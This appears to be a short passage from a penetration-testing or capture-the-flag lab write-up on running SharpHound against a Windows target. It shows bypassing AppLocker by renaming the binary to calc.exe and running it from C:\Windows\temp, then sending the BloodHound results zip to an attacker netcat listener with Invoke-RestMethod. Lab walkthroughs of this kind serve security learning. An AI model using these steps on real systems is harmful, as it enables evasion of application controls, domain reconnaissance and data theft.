Find a writeable directory on the box and use a `python` web server to get the files onto the target. (Use the SharpHound.exe)

Try to run it and get knocked back!

```bash
.\SharpHound.exe

This is an `AppLocker` issue. To get around this we need to run the binary from a "white listed" directory on the target. We can get a list of these directories from [this link](https://github.com/api0cradle/UltimateAppLockerByPassList)

> Just to be safe I also renamed the binary to `calc.exe` no idea if that is going to make a difference but it makes me feel better

```bash
mv SharpHound.exe calc.exe
copy calc.exe C:\Windows\temp\calc.exe
C:\Windows\temp\calc.exe

Finally got the ZIP file off the box and onto our machine:

```bash
# On our Kali box
nc -lvnp 1337 > bloodhound_results.zip
# On the target
Invoke-RestMethod -Uri http://10.10.14.3:1337/ -Method Post -InFile bloodhound.zip
```

Only way to tell if it's finished is to compare the size of the files on the Kali box and the host.
